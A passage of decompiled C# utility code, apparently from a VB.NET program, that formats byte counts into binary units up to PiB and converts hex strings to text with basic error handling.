			return Conversions.ToString(Math.Round(dblBytes / 1125899906842624.0, 2)) + " PiB";
		}
		if (dblBytes >= 1099511627776.0)
		{
			return Conversions.ToString(Math.Round(dblBytes / 1099511627776.0, 2)) + " TiB";
		}
		if (dblBytes >= 1073741824.0)
		{
			return Conversions.ToString(Math.Round(dblBytes / 1073741824.0, 2)) + " GiB";
		}
		if (dblBytes >= 1048576.0)
		{
			return Conversions.ToString(Math.Round(dblBytes / 1048576.0, 2)) + " MiB";
		}
		if (dblBytes >= 1024.0)
		{
			return Conversions.ToString(Math.Round(dblBytes / 1024.0, 2)) + " KiB";
		}
		return Conversions.ToString(dblBytes) + " Bytes";
	}

	private string HexToString(string sText)
	{
		try
		{
			string text = sText;
			string text2 = "";
			string text3 = "";
			if (text.StartsWith("0x"))
			{
				text = text.Substring(2);
			}
			for (int i = 0; i < text.Length; i = checked(i + 2))
			{
				text3 = text.Substring(i, 2);
				text2 += Conversions.ToString(Strings.ChrW((int)ushort.Parse(text3, NumberStyles.HexNumber)));
			}
			return text2;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string result = "ERROR: Your HEX string is not well formated! (" + ex2.Message + ")";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
